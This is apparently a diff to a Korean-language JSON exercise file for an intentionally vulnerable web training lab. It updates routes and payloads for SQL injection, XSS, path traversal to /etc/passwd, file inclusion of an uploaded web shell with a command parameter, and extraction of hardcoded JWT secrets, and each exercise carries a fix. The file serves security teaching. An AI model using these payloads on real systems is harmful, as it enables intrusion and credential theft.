@@ -66,7 +66,7 @@
       "owasp": "A03:2021 Injection",
       "ref": "https://portswigger.net/web-security/sql-injection/union-attacks",
       "goal": "검색 파라미터에서 UNION SELECT로 users 테이블의 자격증명을 추출한다.",
-      "route": "/search?q=",
+      "route": "/?q=",
       "steps": [
         {
           "desc": "먼저 주입 지점을 찾는다. 홈 상단 검색창(/?q=)에 작은따옴표 하나만 넣어 DB 오류(쿼리 노출)가 나는지 확인",
@@ -105,7 +105,7 @@
       "owasp": "A03:2021 Injection",
       "ref": "https://portswigger.net/web-security/sql-injection/examining-the-database",
       "goal": "MySQL/MariaDB 시스템 뷰(information_schema)로 테이블·컬럼 구조를 알아낸다.",
-      "route": "/search?q=",
+      "route": "/?q=",
       "steps": [
         {
           "desc": "현재 DB의 테이블 목록을 뽑는다(검색창 /?q=)",
@@ -132,7 +132,7 @@
       "owasp": "A03:2021 Injection",
       "ref": "https://portswigger.net/web-security/sql-injection/blind",
       "goal": "응답 차이(참/거짓)만으로 데이터를 한 글자씩 추출하거나, 저장된 값이 나중 쿼리에서 실행되는 2차 주입을 이해한다.",
-      "route": "/search?q=",
+      "route": "/?q=",
       "steps": [
         {
           "desc": "참 조건",
@@ -154,7 +154,7 @@
       "owasp": "A03:2021 Injection (XSS)",
       "ref": "https://owasp.org/www-community/attacks/xss/",
       "goal": "검색어/파라미터가 이스케이프 없이 응답에 삽입되는 지점을 찾아 스크립트를 실행한다.",
-      "route": "/search?q= 또는 /xss?input=",
+      "route": "/?q= 또는 /xss?input=",
       "steps": [
         {
           "desc": "기본 페이로드",
@@ -409,7 +409,7 @@
       "steps": [
         {
           "desc": "상위 경로 탐색",
-          "payload": "/download?file=../../etc/passwd"
+          "payload": "/download?file=../../../../../../etc/passwd"
         },
         {
           "desc": "앱 소스 획득",
@@ -682,11 +682,11 @@
       "steps": [
         {
           "desc": "소스 노출/상위 경로",
-          "payload": "/theme?name=../lib"
+          "payload": "/theme?name=/etc/passwd"
         },
         {
           "desc": "업로드한 웹셸 포함",
-          "payload": "/theme?name=../uploads/shell"
+          "payload": "/theme?name=uploads/shell.php&c=id"
         }
       ],
       "fix": "include 대상 화이트리스트, 사용자 입력으로 경로 조립 금지.",
@@ -836,7 +836,7 @@
       "owasp": "A05:2021 Security Misconfiguration",
       "ref": "https://cwe.mitre.org/data/definitions/798.html",
       "goal": "소스에 JWT 시크릿·API 키가 하드코딩되어 LFI/경로탐색으로 유출 시 전면 위조가 가능하다.",
-      "route": "/download?file=../lib.php, /theme?name=../lib",
+      "route": "/download?file=../lib.php (PHP)·../jwt.js (Node)",
       "steps": [
         {
           "desc": "소스 확보 후 시크릿 추출",
